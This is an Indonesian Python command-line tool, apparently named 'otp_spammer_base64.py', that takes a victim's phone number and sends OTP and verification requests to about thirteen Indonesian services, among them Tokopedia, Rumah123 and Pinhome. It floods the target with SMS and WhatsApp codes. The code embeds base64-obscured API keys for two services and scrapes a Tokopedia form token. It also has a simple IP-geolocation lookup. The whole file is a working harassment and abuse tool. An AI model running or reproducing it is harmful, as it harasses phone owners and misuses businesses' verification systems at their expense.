#!/usr/bin/env python3
import requests
import sys
import time
import re
import base64
import json
from datetime import datetime

HISTORY_FILE = "riwayat.log"

def log_history(user, action, detail=""):
    with open(HISTORY_FILE, "a") as f:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{ts}] {user} -> {action} {detail}\n")

# ---------- Base64 encoded tokens ----------
# (semua token diambil dari script asli, di-base64-kan)
TOKENS = {
    "SATURDAYS_API_KEY": base64.b64decode("R0NNVURpdVk1YTdXdnlVTnQzbjNRenRUb1NISno3S1Vq").decode(),
    "IRA_API_KEY": base64.b64decode("MjgwOTk5IUZUVGg=").decode(),
}

# ---------- Fungsi kirim OTP ----------
def send_otp(platform, phone):
    if "customSend" in platform:
        return platform["customSend"](phone)
    try:
        method = platform["method"]
        url = platform["url"]
        headers = platform["headers"]
        if method == "POST":
            payload = platform["payload"](phone)
            resp = requests.post(url, json=payload, headers=headers, timeout=30)
        else:
            url = platform["buildUrl"](phone) if "buildUrl" in platform else url
            resp = requests.get(url, headers=headers, timeout=30)
        if resp.status_code < 400:
            return {"success": True, "status": resp.status_code}
        else:
            return {"success": False, "status": resp.status_code, "error": resp.text[:100]}
    except Exception as e:
        return {"success": False, "status": 0, "error": str(e)}

# ---------- Daftar platform dengan token Base64 ----------
OTP_PLATFORMS = [
    {
        "name": "Rumah123",
        "url": "https://www.rumah123.com/api/otp/request-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://www.rumah123.com"
        },
        "payload": lambda phone: {
            "phoneNumber": phone,
            "ipAddress": "103.166.26.108",
            "portalId": 1,
            "type": "WHATSAPP"
        }
    },
    {
        "name": "SATURDAYS",
        "url": "https://beta.api.saturdays.com/api/v1/user/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "Accept": "*/*",
            "Authorization": "undefined",
            "Content-Type": "application/json",
            "Country-Code": "ID",
            "Currency-Code": "IDR",
            "Device-Type": "mweb",
            "Platform": "mweb",
            "Origin": "https://saturdays.com",
            "Referer": "https://saturdays.com/",
            "X-Api-Key": TOKENS["SATURDAYS_API_KEY"],  # Base64 decoded
            "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site"
        },
        "payload": lambda phone: {
            "number": re.sub(r'^\+?62|^0', '', phone),
            "country_code": "+62",
            "type": ""
        }
    },
    {
        "name": "IRA - Internet Rakyat",
        "url": "https://internetrakyat.id/api/app/auth/send-otp-register",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json",
            "x-api-key": TOKENS["IRA_API_KEY"]  # Base64 decoded
        },
        "payload": lambda phone: {"phone_number": phone}
    },
    {
        "name": "Fastwork",
        "url": "https://api.fastwork.id/auth/v2/signup.sendVerificationCode",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json"
        },
        "payload": lambda phone: {"phone_number": "0" + re.sub(r'^62', '', phone)}
    },
    {
        "name": "Planet Ban",
        "url": "https://api.planetban.com/website/customer/request-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json"
        },
        "payload": lambda phone: {"phone": phone}
    },
    {
        "name": "Pinhome",
        "url": "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "https://www.pinhome.id"
        },
        "payload": lambda phone: {
            "accountType": "customers",
            "applicationType": "Pinhome Web",
            "countryCode": "62",
            "medium": "whatsapp",
            "otpType": "register",
            "phoneNumber": re.sub(r'^62|^0', '', phone)
        }
    },
    {
        "name": "Tokopedia (WA)",
        "customSend": lambda phone: (lambda: None)()
    },
    {
        "name": "Bunda",
        "url": "https://cms.bunda.co.id/api/v1/auth/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.bunda.co.id",
            "Referer": "https://www.bunda.co.id/id",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*"
        },
        "payload": lambda phone: {"phone_number": "62" + re.sub(r'^0', '', phone), "type": "auth"}
    },
    {
        "name": "Dokterin",
        "url": "https://api.dokterin.id/user/v1/users/login",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://partner.dokterin.co.id",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        "payload": lambda phone: {
            "phone": "62" + re.sub(r'^0', '', phone),
            "tnc_accept": True,
            "device": "Blink",
            "platform": "web",
            "host": "https://partner.dokterin.co.id"
        }
    },
    {
        "name": "Bonus Belanja",
        "url": "https://www.bonusbelanja.com/api/auth/registration/app",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://www.bonusbelanja.com"
        },
        "payload": lambda phone: {
            "phone": "0" + re.sub(r'^62', '', phone),
            "name": "user" + str(int(time.time()) % 10000),
            "agreeTnc": True,
            "agreeContact": True
        }
    },
    {
        "name": "Adiraku",
        "url": "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://www.adiraku.co.id"
        },
        "payload": lambda phone: {
            "mobileNumber": "0" + re.sub(r'^62', '', phone),
            "type": "prospect-create",
            "channel": "whatsapp"
        }
    },
    {
        "name": "Paper.id",
        "url": "https://register.paper.id/api/v1/auth/register/send-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.paper.id",
            "Referer": "https://www.paper.id/"
        },
        "payload": lambda phone: {"phone": phone, "method": "whatsapp", "registered_by": "web"}
    },
    {
        "name": "Duniagames",
        "url": "https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://duniagames.co.id",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "X-Device": "fd283d16-f66f-431f-abdf-7ef32f5fe6d0"
        },
        "payload": lambda phone: {
            "phoneNumber": "+" + re.sub(r'^0', '62', phone),
            "userName": re.sub(r'^0', '62', phone)
        }
    }
]

# ---------- Fungsi khusus Tokopedia ----------
def tokopedia_otp(phone):
    try:
        get_url = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{phone}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest"
        }
        r = requests.get(get_url, headers=headers, timeout=10)
        token_match = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', r.text)
        if not token_match:
            return {"success": False, "error": "Token not found"}
        tk = token_match.group(1)
        post_url = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {
            "otp_type": "116",
            "msisdn": phone,
            "tk": tk,
            "email": "",
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        r2 = requests.post(post_url, data=data, headers=headers, timeout=10)
        return {"success": r2.status_code < 400, "status": r2.status_code}
    except Exception as e:
        return {"success": False, "error": str(e)}

# Pasang customSend untuk Tokopedia
for p in OTP_PLATFORMS:
    if p["name"] == "Tokopedia (WA)":
        p["customSend"] = tokopedia_otp

# ---------- IP Tracker (tetap sama) ----------
def track_ip(ip):
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10)
        if r.status_code == 200 and not r.json().get("bogon"):
            data = r.json()
            return {
                "success": True,
                "ip": data.get("ip", ip),
                "hostname": data.get("hostname", "-"),
                "city": data.get("city", "-"),
                "region": data.get("region", "-"),
                "country": data.get("country", "-"),
                "loc": data.get("loc", "-"),
                "org": data.get("org", "-"),
                "timezone": data.get("timezone", "-")
            }
        r2 = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,query", timeout=10)
        if r2.json().get("status") == "success":
            d = r2.json()
            return {
                "success": True,
                "ip": d.get("query", ip),
                "hostname": "-",
                "city": d.get("city", "-"),
                "region": d.get("regionName", "-"),
                "country": d.get("country", "-"),
                "loc": "-",
                "org": d.get("isp") or d.get("org", "-"),
                "timezone": "-"
            }
        return {"success": False, "message": "IP tidak ditemukan"}
    except Exception as e:
        return {"success": False, "message": str(e)}

# ---------- CLI ----------
def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python otp_spammer_base64.py spam 08123456789")
        print("  python otp_spammer_base64.py ip 1.1.1.1")
        sys.exit(1)

    cmd = sys.argv[1].lower()
    if cmd == "spam":
        if len(sys.argv) < 3:
            print("Masukkan nomor: python otp_spammer_base64.py spam 08123456789")
            sys.exit(1)
        raw = re.sub(r'\D', '', sys.argv[2])
        if len(raw) < 10:
            print("Nomor terlalu pendek.")
            sys.exit(1)
        if raw.startswith('0'):
            phone_api = '62' + raw[1:]
        elif raw.startswith('62'):
            phone_api = raw
        else:
            print("Nomor harus diawali 08 atau 62.")
            sys.exit(1)
        log_history("CLI", "/spam", raw)

        print(f"🚀 Spam ke {raw} ...")
        results = []
        success = fail = 0
        for platform in OTP_PLATFORMS:
            res = send_otp(platform, phone_api)
            if res.get("success"):
                results.append(f"✅ {platform['name']}: HTTP {res['status']}")
                success += 1
            else:
                err = res.get("error", f"HTTP {res.get('status',0)}")
                results.append(f"❌ {platform['name']}: {err[:50]}")
                fail += 1
            time.sleep(0.5)

        print("\n".join(results))
        print(f"\n✅ Berhasil: {success} | ❌ Gagal: {fail}")

    elif cmd == "ip":
        if len(sys.argv) < 3:
            print("Masukkan IP/domain: python otp_spammer_base64.py ip 1.1.1.1")
            sys.exit(1)
        target = sys.argv[2]
        log_history("CLI", "/ip", target)
        print(f"🔍 Melacak {target} ...")
        res = track_ip(target)
        if not res.get("success"):
            print(f"❌ {res.get('message')}")
        else:
            print(f"""
🌐 IP Tracker
📌 IP: {res['ip']}
🏠 Hostname: {res['hostname']}
📍 Kota: {res['city']}
🗺️ Region: {res['region']}
🌍 Negara: {res['country']}
📡 Lokasi: {res['loc']}
🏢 ISP: {res['org']}
⏰ Timezone: {res['timezone']}
""")
    else:
        print("Perintah tidak dikenal. Gunakan 'spam' atau 'ip'.")

if __name__ == "__main__":
    main()